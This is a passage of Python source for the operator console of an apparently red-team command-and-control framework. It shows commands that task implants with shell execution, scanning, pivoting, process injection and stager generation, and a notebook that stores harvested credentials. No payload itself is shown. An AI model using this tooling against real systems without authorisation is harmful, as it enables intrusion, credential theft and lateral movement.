    for line in payload.get("summary") or []:
        print(f"  {line}", file=out)
    parts = payload.get("parts") or []
    if parts:
        print("  the score:", file=out)
        for p in parts:
            print(f"    {str(p.get('name', '?')):<14} "
                  f"{str(p.get('value', '?')):>3} of {str(p.get('weight', '?'))}  "
                  f"{p.get('note', '')}", file=out)
    persist = payload.get("persist") or []
    if persist:
        print("  the persistence:", file=out)
        for p in persist:
            print(f"    {str(p.get('technique', '?')):<18} "
                  f"{str(p.get('state', '?')):<10} {p.get('location', '')}", file=out)
    canaries = payload.get("canaries") or []
    if canaries:
        print("  the tripwires:", file=out)
        for c in canaries:
            print(f"    {str(c.get('id', '?')):<10} {str(c.get('state', '?')):<10} "
                  f"{c.get('label', '')}", file=out)
    approvals = payload.get("approvals") or []
    if approvals:
        print("  the requests:", file=out)
        for a in approvals:
            print(f"    {str(a.get('id', '?')):<10} {str(a.get('state', '?')):<10} "
                  f"{a.get('kind', '')}", file=out)
    gaps = payload.get("gaps") or []
    if gaps:
        print("  what is not known:", file=out)
        for gap in gaps:
            print(f"    {gap}", file=out)


def print_dossiers(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the files of every host, the weakest first."""
    out = stream or sys.stdout
    rows = payload.get("dossiers") or []
    if not rows:
        print("no host has checked in yet", file=out)
        return
    rendered = [
        [
            r.get("id", "?"),
            r.get("host", "") or "-",
            r.get("state", "?"),
            r.get("score", "?"),
            r.get("grade", "?"),
            r.get("tasks_done", 0),
            r.get("tasks_failed", 0),
            r.get("persist_broken", 0),
        ]
        for r in rows
    ]
    print(table(["AGENT", "HOST", "STATE", "SCORE", "GRADE", "DONE", "FAILED",
                 "BROKEN"], rendered), file=out)


def print_audit(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the audit trail: one line per operator action, newest first."""
    out = stream or sys.stdout
    entries = payload.get("entries") or []
    if not payload.get("enabled", True):
        print("audit log is disabled on this server (audit_file is empty)", file=out)
        return
    if not entries:
        print("no recorded operator actions", file=out)
        return
    for e in entries:
        mark = "ok " if e.get("ok") else "ERR"
        detail = short(e.get("detail") or "", 40)
        extra = ""
        if e.get("agent_id"):
            extra += f" agent={e['agent_id']}"
        if e.get("task_id"):
            extra += f" task={e['task_id']}"
        if e.get("err"):
            extra += f" err={short(e['err'], 40)!r}"
        if detail:
            extra += f" {detail}"
        print(
            f"[{fmt_ts(e.get('at'))}] {mark} {str(e.get('operator')):<12} "
            f"{str(e.get('cmd')):<14}{extra} ({e.get('ms', 0)} ms)",
            file=out,
        )


def watch_events(client: OperatorClient, limit: int = 0, as_json: bool = False) -> int:
    """Block, printing events as they arrive, until Ctrl-C or `limit` events.

    `umbra watch` exists because events are the only way to notice a new beacon
    or a finished task without polling: the console prints them on stderr while
    a command runs, but a dedicated stream is what an operator leaves open on a
    second terminal.
    """
    seen = 0
    try:
        while True:
            ev = client.next_event(timeout=3600.0)
            if ev is None:
                continue
            if as_json:
                print(json.dumps({"kind": ev.get("kind"), "at": ev.get("at"),
                                  "agent_id": ev.get("agent_id"), "task_id": ev.get("task_id"),
                                  "data": ev.get("data") or {}},
                                 sort_keys=True, default=json_default), flush=True)
            else:
                print_event(ev, stream=sys.stdout)
                sys.stdout.flush()
            seen += 1
            if limit and seen >= limit:
                return 0
    except KeyboardInterrupt:
        print(f"\n{seen} event(s)", file=sys.stderr)
        return 0


def print_artifacts(rows: List[Dict[str, Any]]) -> None:
    """The artifacts the team server holds."""
    if not rows:
        print("the artifact store is empty")
        return
    table_rows = [
        [
            str(a.get("name", "?")),
            str(a.get("size", "?")),
            str(a.get("sha256", ""))[:16],
            fmt_ts(a.get("created")),
        ]
        for a in rows
    ]
    print(table(["NAME", "SIZE", "SHA256", "CREATED"], table_rows))


def print_sessions(rows: List[Dict[str, Any]]) -> None:
    """Print the interactive sessions that are open."""
    if not rows:
        print("no session is open")
        return
    print(table(
        ["session", "agent", "task", "bytes", "last"],
        [[row.get("id", ""), row.get("agent_id", ""), row.get("task_id", ""),
          str(row.get("bytes", 0)), fmt_ts(row.get("last", 0))]
         for row in rows]))


def print_events(rows: List[Dict[str, Any]]) -> None:
    """Print a list of journal events, oldest first."""
    if not rows:
        print("no event")
        return
    for ev in rows:
        print_event(ev)


def print_event(ev: Dict[str, Any], stream: Any = None) -> None:
    kind = ev.get("kind", "?")
    at = fmt_ts(ev.get("at"))
    agent = ev.get("agent_id", "")
    data = ev.get("data") or {}
    detail = ""
    if kind == "task.result":
        detail = f"task={ev.get('task_id')} exit={data.get('code')}"
        if data.get("binary"):
            # The event carries only a size for binary payloads; the bytes are
            # in task.get.
            detail += f" binary={data.get('size', 0)}B"
        else:
            out = decode_out(data.get("output", ""))
            if out:
                detail += f" out={short(out, 60)!r}"
        if data.get("meta"):
            detail += " meta=" + ",".join(sorted(str(k) for k in data["meta"]))
    elif kind in ("agent.new", "agent.online"):
        parts = [f"{k}={data[k]}" for k in ("host", "os", "transport") if data.get(k)]
        detail = " ".join(parts)
    elif kind == "task.queued":
        detail = f"task={ev.get('task_id')} kind={data.get('kind')}"
    elif kind == "beacon.error":
        detail = f"code={data.get('code')} {short(str(data.get('msg') or ''), 60)!r}"
    elif kind == "agent.policy":
        detail = f"sleep={data.get('sleep')} jitter={data.get('jitter')}"
    print(f"[{at}] {kind:<14} {agent:<20} {detail}".rstrip(), file=stream or sys.stdout)


# ---------------------------------------------------------------------------
# client wrapper
# ---------------------------------------------------------------------------
class Console:
    def __init__(self, client: OperatorClient, *, watch: bool = False,
                 store: Optional[db.StateStore] = None) -> None:
        self.client = client
        self.watch = watch
        self.current_agent: Optional[str] = None
        # The local notebook is optional: the console works without it.
        self.store = store
        self.session = 0
        # The numbers of the status line: refreshed after every command, so
        # the prompt never waits for the server.
        self._status: Dict[str, Any] = {}

    # -- notebook --------------------------------------------------------
    def note_task(self, task_id: str, agent: str, kind: str,
                  args: Any = None) -> None:
        """Record a queued task in the local state database."""
        if self.store is None or not task_id:
            return
        try:
            self.store.record_task(task_id, agent, kind, args, self.session)
        except Exception:  # noqa: BLE001 - never break the console
            pass

    def note_result(self, task_id: str, task: Dict[str, Any]) -> None:
        """Record a task result in the local state database.

        The material a task produced is kept in the notebook as well: the
        findings of a reconnaissance, the screenshot of a host, the
        credentials that were collected.  The notebook is what the operator
        searches three hours later.
        """
        if self.store is None or not task_id:
            return
        try:
            self.store.record_result(
                task_id,
                int(task.get("code") or 0),
                task.get("out") or b"",
                str(task.get("err") or ""),
            )
        except Exception:  # noqa: BLE001 - never break the console
            pass
        self.note_material(task)

    def note_material(self, task: Dict[str, Any]) -> None:
        """Keep the findings, the screenshots and the material of a result."""
        if self.store is None:
            return
        meta = task.get("meta") or {}
        agent = str(task.get("agent_id", "") or "")
        try:
            report = meta.get("recon")
            if isinstance(report, dict):
                for finding in report.get("findings") or []:
                    if not isinstance(finding, dict):
                        continue
                    self.store.add_finding(
                        agent,
                        str(finding.get("kind", "")),
                        str(finding.get("name", "")),
                        str(finding.get("detail", "")),
                        str(finding.get("severity", "info")),
                        str(finding.get("source", "")),
                    )
            credentials = meta.get("credentials")
            if isinstance(credentials, list):
                for record in credentials:
                    if not isinstance(record, dict):
                        continue
                    self.store.add_credential(
                        str(record.get("agent_id", "") or agent),
                        str(record.get("kind", "")),
                        str(record.get("account", "")),
                        str(record.get("target", "")),
                        str(record.get("secret", "")),
                        str(record.get("source", "")),
                        int(record.get("confidence", 0) or 0),
                    )
            screenshot = meta.get("screenshot")
            if isinstance(screenshot, dict):
                self.store.add_screenshot(
                    agent,
                    str(screenshot.get("path", "")),
                    str(screenshot.get("sha256", "")),
                    int(screenshot.get("size", 0) or 0),
                )
        except Exception:  # noqa: BLE001 - never break the console
            pass

    def note_artifact(self, name: str, agent: str = "", digest: str = "",
                      path: str = "", size: int = 0) -> None:
        """Keep an artefact the operator pulled off a host."""
        if self.store is None:
            return
        try:
            self.store.add_artifact(name, agent, digest, path, size)
        except Exception:  # noqa: BLE001 - never break the console
            pass

    def refresh_status(self) -> None:
        """Refresh the numbers of the status line.

        A status line that blocks on a round trip is worse than no status
        line, so a failure leaves the last numbers in place.
        """
        try:
            stats = self.client.stats()
        except Exception:  # noqa: BLE001 - the status is a convenience
            return
        if not isinstance(stats, dict):
            return
        self._status.update(stats)
        agent = self.current_agent
        if agent:
            try:
                for row in self.client.agents():
                    if row.get("id") == agent:
                        self._status["sleep"] = row.get("sleep")
                        break
            except Exception:  # noqa: BLE001 - the status is a convenience
                return

    def _resolve(self, agent: Optional[str]) -> str:
        target = agent or self.current_agent
        if not target:
            raise OperatorError("no agent selected (use `use <id>` or pass an id)")
        return target

    def run_command(self, line: str) -> bool:
        """Execute one console command. Returns False to exit."""
        try:
            argv = shlex.split(line)
        except ValueError as exc:
            print(f"parse error: {exc}")
            return True
        if not argv:
            return True
        cmd, rest = argv[0].lower(), argv[1:]
        try:
            if cmd in ("quit", "exit", "q"):
                return False
            if cmd in ("help", "?", "h"):
                print_help()
            elif cmd == "agents" or cmd == "ls":
                # `agents state=online tag=dc` narrows the inventory with the
                # same filter language the server understands.
                print_agents(self.client.agents(**parse_filter(" ".join(rest))))
            elif cmd == "alerts":
                print_alerts(self.client.alerts())
            elif cmd == "triage":
                if not rest:
                    print("usage: triage <path>")
                    return True
                task_id = self.client.submit(self.target(), "triage", {"path": rest[0]})
                self.note_task(task_id, self.target(), "triage", {"path": rest[0]})
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "find":
                options = parse_filter(" ".join(rest))
                path = options.pop("path", ".")
                content = options.pop("content", "")
                name = rest[0] if rest else ""
                task_id = self.client.submit(self.target(), "find",
                                             {"path": path, "name": name, "content": content})
                self.note_task(task_id, self.target(), "find", {"path": path, "name": name})
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "netinfo":
                task_id = self.client.submit(self.target(), "netinfo", {})
                self.note_task(task_id, self.target(), "netinfo", {})
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "scan":
                # scan <target> [ports=22,80,443]
                if not rest:
                    print("usage: scan <target> [ports=22,80,443]")
                    return True
                options = parse_filter(" ".join(rest[1:]))
                task_args = {"host": rest[0],
                             "ports": options.get("ports", "22,80,443")}
                task_id = self.client.submit(self.target(), "scan", task_args)
                self.note_task(task_id, self.target(), "scan", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "resolve":
                if not rest:
                    print("usage: resolve <host>")
                    return True
                task_args = {"host": rest[0]}
                task_id = self.client.submit(self.target(), "resolve", task_args)
                self.note_task(task_id, self.target(), "resolve", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "env":
                options = parse_filter(" ".join(rest))
                task_args = {"filter": options.get("filter", "")}
                task_id = self.client.submit(self.target(), "env", task_args)
                self.note_task(task_id, self.target(), "env", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "touch":
                if not rest:
                    print("usage: touch <path>")
                    return True
                task_args = {"path": rest[0]}
                task_id = self.client.submit(self.target(), "touch", task_args)
                self.note_task(task_id, self.target(), "touch", task_args)
                print_task_result(self.client.wait_for_result(task_id))
            elif cmd == "artifact":
                # artifact list | put <file> [name] | get <name> <file> | remove <name>
                if not rest:
                    print("usage: artifact list|put <file>|get <name> <file>|remove <name>")
                    return True
                action = rest[0]
                if action == "list":
                    print_artifacts(self.client.artifact_list())
                elif action == "put" and len(rest) > 1:
                    name = rest[2] if len(rest) > 2 else os.path.basename(rest[1])
                    info = self.client.artifact_upload(name, rest[1])
                    print(f"stored {info.get('name')} ({info.get('size')} bytes)")
                elif action == "get" and len(rest) > 2:
                    info = self.client.artifact_download(rest[1], rest[2])
                    print(f"wrote {info.get('bytes')} bytes to {info.get('local')}")
                elif action == "remove" and len(rest) > 1:
                    self.client.artifact_remove(rest[1])
                    print(f"removed {rest[1]}")
                else:
                    print("usage: artifact list|put <file>|get <name> <file>|remove <name>")
            elif cmd == "panic":
                # The end of an engagement on the target side: the operator
                # says the word, so a stray keystroke does not burn the fleet.
                try:
                    answer = input("type 'panic' to continue: ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    print("nothing was changed")
                    return True
                if answer != "panic":
                    print("nothing was changed")
                    return True
                if "--all" in rest:
                    data = self.client.panic(all_agents=True)
                else:
                    target = rest[0] if rest else self.target()
                    data = self.client.panic([target])
                print(f"panicked {data.get('count', 0)} agent(s)")
                for agent_id in data.get("panicked", []):
                    print(f"  {agent_id}")
            elif cmd == "chain":
                # chain <agent> shell:{"cmd":"id"} shell:{"cmd":"cat {{output}}"}
                if not rest:
                    print("usage: chain <agent> <kind>:<json> ...")
                    return True
                stages = []
                for item in rest[1:]:
                    kind, _, raw = item.partition(":")
                    args = json.loads(raw) if raw.strip() else {}
                    stages.append({"kind": kind, "args": args})
                data = self.client.submit_chain(rest[0], stages)
                print(f"chain {data.get('chain_id', '?')} queued ({len(stages)} stages)")
            elif cmd == "session":
                # session [cmd] -- an interactive shell on the selected agent.
                opened = self.client.open_session(self.target(),
                                                   rest[0] if rest else "")
                task_id = str(opened.get("task_id", ""))
                print(f"session task {task_id} queued (type to send, ctrl-c to stop)")
                stream_session(self.client, self, self.target(), task_id, 300.0)
            elif cmd == "tag":
                if len(rest) < 2:
                    print("usage: tag <agent> <label>...")
                    return True
                mode = "remove" if "--remove" in rest else ("set" if "--set" in rest else "add")
                labels = [t for t in rest[1:] if not t.startswith("--")]
                data = self.client.tag_agents(labels, mode=mode, agents=[rest[0]])
                print(f"{mode}: {', '.join(labels)} on {len(data.get('updated', []))} agent(s)")
            elif cmd == "policy":
                if len(rest) < 2:
                    print("usage: policy <agent> sleep=60 jitter=35 [obfuscate=0]")
                    return True
                options = parse_filter(" ".join(rest[1:]))
                sleep = int(options.get("sleep", 60))
                jitter = int(options.get("jitter", 20))
                obfuscate = None
                if "obfuscate" in options:
                    obfuscate = options["obfuscate"] not in ("0", "false", "no")
                data = self.client.set_policy(sleep, jitter, obfuscate=obfuscate,
                                              agents=[rest[0]])
                print(f"policy pushed to {len(data.get('updated', []))} agent(s): "
                      f"sleep {sleep}s, jitter {jitter}%")
            elif cmd == "use":
                if not rest:
                    print(f"current agent: {self.current_agent or '(none)'}")
                else:
                    self.current_agent = rest[0]
                    print(f"current agent: {self.current_agent}")
                    # Tell the team; a shared engagement should not need a
                    # second message to say who is looking at what.
                    try:
                        self.client.focus(rest[0])
                    except OperatorError as exc:
                        print(f"focus not shared: {exc}")
            elif cmd == "info":
                data = self.client.agent_info(self._resolve(rest[0] if rest else None))
                print(json.dumps(data, indent=2, default=str, sort_keys=True))
            elif cmd == "run":
                if not rest:
                    print("usage: run <command>")
                    return True
                self._submit_and_maybe_wait("shell", {"cmd": " ".join(rest)}, watch=False)
            elif cmd == "exec":
                if not rest:
                    print('usage: exec <kind> [json-args]   e.g. exec sysinfo')
                    return True
                kind = rest[0]
                args = json.loads(" ".join(rest[1:])) if len(rest) > 1 else {}
                self._submit_and_maybe_wait(kind, args, watch=True)
            elif cmd in ("get", "download"):
                if len(rest) < 2:
                    print("usage: get <remote-path> <local-path>")
                    return True
                info = self.client.download_file(
                    self._resolve(None), rest[0], rest[1], progress=_progress_printer())
                print(f"downloaded {info['bytes']} bytes -> {info['local']} ({info['chunks']} chunk(s))")
            elif cmd in ("put", "upload"):
                if len(rest) < 2:
                    print("usage: put <local-path> <remote-path>")
                    return True
                info = self.client.upload_file(
                    self._resolve(None), rest[0], rest[1], progress=_progress_printer())
                print(f"uploaded {info['bytes']} bytes -> {info['path']} ({info['chunks']} chunk(s))")
            elif cmd == "tasks":
                # tasks [limit] [trace]
                limit = 20
                trace = ""
                for word in rest:
                    if word.startswith("--trace="):
                        trace = word.split("=", 1)[1]
                    elif word.isdigit() and limit == 20:
                        limit = int(word)
                    elif not trace and not word.isdigit():
                        trace = word
                print_tasks(self.client.tasks(self._resolve(None), limit,
                                             trace=trace))
            elif cmd == "result":
                if not rest:
                    print("usage: result <task-id>")
                    return True
                print_task_result(self.client.task(rest[0]))
            elif cmd == "retry":
                if not rest:
                    print("usage: retry <task-id>")
                    return True
                res = self.client.retry(rest[0])
                print(f"queued {res.get('task_id')} (the task {rest[0]} is retried)")
            elif cmd == "sessions":
                print_sessions(self.client.sessions())
            elif cmd == "events":
                limit = int(rest[0]) if rest else 50
                print_events(self.client.events(0, limit).get("events") or [])
            elif cmd == "watch":
                self.watch = (rest[0].lower() not in ("off", "0", "false")) if rest else (not self.watch)
                print(f"event watch: {'on' if self.watch else 'off'}")
            elif cmd == "sleep":
                if len(rest) < 2:
                    print("usage: sleep <seconds> [jitter%]")
                    return True
                jitter = int(rest[1]) if len(rest) > 1 else 20
                self.client.set_sleep(self._resolve(None), int(rest[0]), jitter)
                print("beacon policy updated")
            elif cmd == "kill":
                # `kill` is the abrupt one, `kill-soft` lets the agent
                # finish the work it has in hand first.
                agent = self._resolve(rest[0] if rest else None)
                if len(rest) > 1 and rest[1] == "soft":
                    self.client.kill_agent(agent, exit_after=True)
                    print("exit task queued")
                else:
                    self.client.kill_agent(agent)
                    print("kill task queued")
            elif cmd in ("cancel", "kill-task"):
                if not rest:
                    print("usage: cancel <task-id>")
                    return True
                try:
                    self.client.cancel(rest[0])
                    print(f"cancelled {rest[0]}")
                except OperatorError as exc:
                    print(f"error: {exc}")
            elif cmd == "db":
                if self.store is None:
                    print("no local database (start the console with --db PATH)")
                    return True
                action = rest[0].lower() if rest else "stats"
                value = rest[1] if len(rest) > 1 else ""
                try:
                    if action == "stats":
                        stats = self.store.stats()
                        print(f"tasks {stats['tasks']}, results {stats['results']}, "
                              f"notes {stats['notes']} ({stats['path']})")
                    elif action == "tasks":
                        print_db_tasks(self.store.tasks(value, 20))
                    elif action == "results":
                        print_db_results(self.store.results(value, 20))
                    elif action == "notes":
                        print_db_notes(self.store.notes(value, 20))
                    elif action == "search":
                        print_db_search(self.store.search(value, 20))
                    elif action == "note":
                        if not value:
                            print("usage: db note \"what I found\"")
                            return True
                        note_id = self.store.add_note(value, "")
                        print(f"note {note_id} recorded")
                    elif action == "findings":
                        print_db_findings(self.store.findings(value, 20))
                    elif action == "artifacts":
                        print_db_artifacts(self.store.artifacts(value, 20))
                    elif action == "screenshots":
                        print_db_screenshots(self.store.screenshots(value, 20))
                    elif action == "creds":
                        print_db_credentials(self.store.credentials(value, 20))
                    elif action == "export":
                        target = value or "umbra-state.md"
                        path = self.store.export(target)
                        print(f"notebook written to {path}")
                    else:
                        print(f"unknown db action {action!r} "
                              "(stats|tasks|results|notes|search|note|findings|"
                              "artifacts|screenshots|creds|export)")
                except db.StateError as exc:
                    print(f"local state error: {exc}")
            elif cmd in ("audit", "log"):
                limit = int(rest[0]) if rest else 30
                print_audit(self.client.audit(limit))
            elif cmd in ("whoami", "me"):
                print_whoami(self.client.whoami())
            elif cmd in ("chat", "say"):
                if rest:
                    to = ""
                    body = list(rest)
                    if body[0].startswith("@") and len(body[0]) > 1:
                        to = body.pop(0)[1:]
                    text = " ".join(body).strip()
                    if not text:
                        print(f"usage: say [@operator] <message>")
                        return True
                    self.client.say(text, to)
                    print(f"sent -> {to}" if to else "sent")
                else:
                    print_chat(self.client.chat_history(20))
            elif cmd in ("claim", "take"):
                if not rest:
                    print("usage: claim <task-id>")
                    return True
                data = self.client.claim(rest[0])
                print(f"claimed {rest[0]} ({data.get('state', '?')})")
            elif cmd in ("release", "drop"):
                if not rest:
                    print("usage: release <task-id>")
                    return True
                self.client.release(rest[0])
                print(f"released {rest[0]}")
            elif cmd == "focus":
                data = self.client.focus(rest[0] if rest else "")
                print(f"focus: {data.get('agent_id') or '(none)'}")
            elif cmd in ("schedule", "cron"):
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_schedules(self.client.schedules())
                elif sub_cmd == "add" and len(rest) >= 3:
                    every = int(rest[3]) if len(rest) > 3 else 300
                    data = self.client.add_schedule(
                        self._resolve(rest[1]), rest[2], every)
                    print(f"scheduled {data['schedule_id']} every {every}s")
                elif sub_cmd in ("rm", "remove") and len(rest) >= 2:
                    self.client.remove_schedule(rest[1])
                    print(f"removed {rest[1]}")
                else:
                    print("usage: schedule [list | add <agent> <kind> [every] | rm <id>]")
            elif cmd in ("operators", "ops"):
                print_operators(self.client.operators())
            elif cmd == "pivot":
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_pivots(self.client.pivot_list(), self.client.pivot_sessions())
                elif sub_cmd == "open" and len(rest) >= 2:
                    mode = "socks"
                    host = ""
                    port = 0
                    listen = ""
                    pipe = False
                    pipe_name = ""
                    path: List[str] = []
                    for token in rest[2:]:
                        if token.startswith("--mode="):
                            mode = token.split("=", 1)[1]
                        elif token.startswith("--host="):
                            host = token.split("=", 1)[1]
                        elif token.startswith("--port="):
                            port = int(token.split("=", 1)[1])
                        elif token.startswith("--listen="):
                            listen = token.split("=", 1)[1]
                        elif token.startswith("--through="):
                            path.append(token.split("=", 1)[1])
                        elif token == "--pipe":
                            pipe = True
                        elif token.startswith("--pipe-name="):
                            pipe_name = token.split("=", 1)[1]
                    data = self.client.pivot_open(
                        rest[1], mode=mode, host=host, port=port, listen=listen,
                        path=path, through=path[0] if path else "",
                        pipe=pipe, pipe_name=pipe_name)
                    print(f"pivot {data.get('stream')} open on {data.get('listen')}")
                elif sub_cmd in ("close", "rm") and len(rest) >= 2:
                    self.client.pivot_close(rest[1])
                    print(f"closed {rest[1]}")
                else:
                    print("usage: pivot [list | open <agent> [--mode=] [--host=] [--port=] "
                          "[--listen=] [--through=] | close <tunnel>]")
            elif cmd == "vpn":
                sub_cmd = rest[0] if rest else "status"
                if sub_cmd == "status":
                    print_vpn_status(self.client.vpn_status())
                elif sub_cmd == "peers":
                    print_vpn_peers(self.client.vpn_peers())
                elif sub_cmd == "allocate" and len(rest) >= 2:
                    print(f"{rest[1]} -> {self.client.vpn_allocate(rest[1])}")
                elif sub_cmd == "routes":
                    print_vpn_routes(self.client.vpn_routes())
                elif sub_cmd == "route" and len(rest) >= 3:
                    data = self.client.vpn_route(rest[1], rest[2])
                    print(f"{data.get('network')} -> {data.get('peer')}")
                elif sub_cmd == "ping" and len(rest) >= 2:
                    data = self.client.vpn_ping(rest[1])
                    print(f"{rest[1]} answered in {data.get('rtt_text', '?')}")
                else:
                    print("usage: vpn [status | peers | allocate <agent> | "
                          "routes | route <peer> <network> | ping <peer>]")
            elif cmd == "armory":
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_armory(self.client.armory_list())
                elif sub_cmd == "search" and len(rest) >= 2:
                    payload = self.client.armory_search(" ".join(rest[1:]))
                    print_armory({"entries": payload.get("entries", []),
                                  "installed": [], "verified": True})
                elif sub_cmd == "needs" and len(rest) >= 2:
                    print_armory_needs(self.client.armory_needs(rest[1]))
                elif sub_cmd == "versions" and len(rest) >= 2:
                    data = self.client.armory_versions(rest[1])
                    print(f"{data.get('name')}: "
                          f"{', '.join(data.get('versions') or []) or 'no versions'}")
                elif sub_cmd == "resolve" and len(rest) >= 2:
                    data = self.client.armory_resolve(rest[1])
                    print(f"install order: {' -> '.join(data.get('order') or [])}")
                elif sub_cmd == "import" and len(rest) >= 2:
                    data = self.client.armory_import(rest[1])
                    print(f"imported {data.get('entries')} entries from {data.get('url', '')}")
                elif sub_cmd == "install" and len(rest) >= 2:
                    data = self.client.armory_install(rest[1])
                    print(f"installed {data.get('name')} ({data.get('size')} bytes)")
                elif sub_cmd in ("remove", "rm") and len(rest) >= 2:
                    self.client.armory_remove(rest[1])
                    print(f"removed {rest[1]}")
                elif sub_cmd == "run" and len(rest) >= 3:
                    task_id = self.client.armory_run(rest[1], rest[2])
                    self.note_task(task_id, rest[2], f"armory:{rest[1]}")
                    print(f"queued {task_id}")
                else:
                    print("usage: armory [list | search <text> | needs <name> | "
                          "versions <name> | resolve <name> | import <url> | "
                          "install <name> | remove <name> | run <name> <agent>]")
            elif cmd == "alias":
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_aliases(self.client.alias_list())
                elif sub_cmd == "run" and len(rest) >= 3:
                    task_id = self.client.alias_run(rest[1], rest[2])
                    self.note_task(task_id, rest[2], f"alias:{rest[1]}")
                    print(f"queued {task_id}")
                elif sub_cmd == "add" and len(rest) >= 3:
                    parts = {}
                    for token in rest[3:]:
                        if token.startswith("--") and "=" in token:
                            key, _, value = token[2:].partition("=")
                            parts[key.replace("-", "_")] = value
                    data = self.client.alias_add(
                        rest[2], kind=parts.get("kind", ""),
                        description=parts.get("description", ""),
                        extension=parts.get("extension", ""))
                    print(f"alias {rest[2]} written by {data.get('by', '?')}")
                elif sub_cmd in ("rm", "remove") and len(rest) >= 2:
                    self.client.alias_remove(rest[1])
                    print(f"alias {rest[1]} removed")
                else:
                    print("usage: alias [list | run <name> <agent> | "
                          "add <name> --kind <kind> | rm <name>]")
            elif cmd == "assign" and len(rest) >= 2:
                data = self.client.assign_task(rest[1], rest[2] if len(rest) > 2 else "")
                print(f"task {rest[1]} -> {data.get('assigned_to', '(unassigned)')}")
            elif cmd == "inbox":
                print_tasks(self.client.inbox(rest[1] if len(rest) > 1 else ""))
            elif cmd == "handover":
                print(render_handover(self.client.team_handover()))
            elif cmd == "who":
                rows = self.client.chat_operators()
                print(table(
                    ["OPERATOR", "ROLE", "FOCUS", "IDLE", "STATE"],
                    [[r.get("name", "?"), r.get("role", "?"),
                      r.get("focus") or "-", f"{r.get('idle_sec', 0)}s",
                      "stale" if r.get("stale") else
                      ("silent" if r.get("silent") else "here")]
                     for r in rows]))
            elif cmd in ("team-sync", "team"):
                print_team(self.client.team_sync())
            elif cmd == "migrate":
                if len(rest) < 1:
                    print("usage: migrate <agent> [--pid N] [--spawn PROG] [--out]")
                    return True
                parts = {}
                for token in rest[1:]:
                    if token.startswith("--") and "=" in token:
                        key, _, value = token[2:].partition("=")
                        parts[key.replace("-", "_")] = value
                task_args = {"mode": "migrate"}
                if parts.get("pid"):
                    task_args["pid"] = int(parts["pid"])
                if parts.get("spawn"):
                    task_args["spawn"] = parts["spawn"]
                if parts.get("out") in ("1", "true", "yes"):
                    task_args["out"] = True
                if parts.get("resume") in ("1", "true", "yes"):
                    task_args["resume"] = True
                agent = self._resolve(rest[1])
                task_id = self.client.submit(agent, "inject", task_args)
                self.note_task(task_id, agent, "inject:migrate", task_args)
                print(f"queued {task_id} for {agent}")
            elif cmd in ("recon", "domain-map", "suggest"):
                if len(rest) < 1:
                    print(f"usage: {cmd} <agent> [--profile NAME] [--target NAME]")
                    return True
                parts = {}
                for token in rest[1:]:
                    if token.startswith("--") and "=" in token:
                        key, _, value = token[2:].partition("=")
                        parts[key.replace("-", "_")] = value
                if cmd == "recon":
                    task_args = {}
                    if parts.get("profile"):
                        task_args["profile"] = parts["profile"]
                    checks = [c.strip() for c in parts.get("checks", "").split(",")
                              if c.strip()]
                    if checks:
                        task_args["checks"] = checks
                    kind = "recon"
                elif cmd == "domain-map":
                    task_args = {}
                    if parts.get("target"):
                        task_args["target"] = parts["target"]
                    kind = "domain.map"
                else:
                    task_args = {}
                    if parts.get("profile"):
                        task_args["profile"] = parts["profile"]
                    kind = "recon.suggest"
                agent = self._resolve(rest[1])
                task_id = self.client.submit(agent, kind, task_args)
                self.note_task(task_id, agent, kind, task_args)
                print(f"queued {task_id} for {agent}")
            elif cmd == "stager":
                parts = dict()
                for token in rest:
                    if token.startswith("--") and "=" in token:
                        key, _, value = token[2:].partition("=")
                        parts[key.replace("-", "_")] = value
                script = self.client.stager_generate(
                    platform=parts.get("platform", "windows"),
                    transport=parts.get("transport", "tcp"),
                    server=parts.get("server", ""),
                    url=parts.get("url", ""),
                    sha256=parts.get("sha256", ""),
                    agent_id=parts.get("agent_id", ""),
                    mode=parts.get("mode", "download"),
                    store=parts.get("store", ""),
                    store_base=parts.get("store_base", ""),
                    dns_domain=parts.get("dns_domain", ""),
                    dns_resolver=parts.get("dns_resolver", ""),
                    smtp_addr=parts.get("smtp_addr", ""),
                    pop3_addr=parts.get("pop3_addr", ""),
                    s3_endpoint=parts.get("s3_endpoint", ""),
                    s3_region=parts.get("s3_region", ""),
                )
                print(script)
            elif cmd == "stats":
                print(json.dumps(self.client.stats(), indent=2, default=str, sort_keys=True))
            elif cmd == "quiet":
                state = rest[0].lower() if rest else "on"
                answer = self.client.quiet(state != "off")
                print("the server is quiet" if answer.get("quiet")
                      else "the server is loud again")
                return True
            elif cmd == "queue":
                print_queue(self.client.queue())
                return True
            elif cmd == "keys":
                # The key of the beacons, replaced while the server runs.
                # A second argument is a file the key is read from, so a
                # key that must not be typed does not have to be.
                target = rest[0] if rest else "agent"
                psk = read_secret("", rest[1]) if len(rest) > 1 else ""
                answer = self.client.rotate_keys(target, psk)
                print(f"the new agent key is {answer.get('psk', '')}")
                print(f"the previous key works for {answer.get('overlap', 0)} seconds")
                return True
            elif cmd == "tokens":
                # The tokens of the operators and their state.
                rows = self.client.tokens()
                print_tokens(rows)
                return True
            elif cmd == "priority" and len(rest) >= 2:
                answer = self.client.set_priority(rest[0], int(rest[1]))
                print(f"task {answer.get('task_id', '')} has priority "
                      f"{answer.get('priority', 0)}")
                return True
            elif cmd in ("test-event", "testevent"):
                # One event of our own, to check that the stream of the
                # server reaches this console.
                answer = self.client.test_event(rest[0] if rest else "test.ping")
                print(f"event {answer.get('seq', '?')} queued")
            elif cmd in ("raw", "rpc"):
                if len(rest) < 1:
                    print("usage: raw <command> [json-args]")
                    return True
                args = json.loads(" ".join(rest[1:])) if len(rest) > 1 else {}
                res = self.client.rpc(rest[0], args)
                print(json.dumps({"ok": res.ok, "data": res.data, "error": res.error}, indent=2, default=str))
            elif cmd in ("batch", "plan"):
                # The plan, from the prompt of the console.
                if len(rest) < 1:
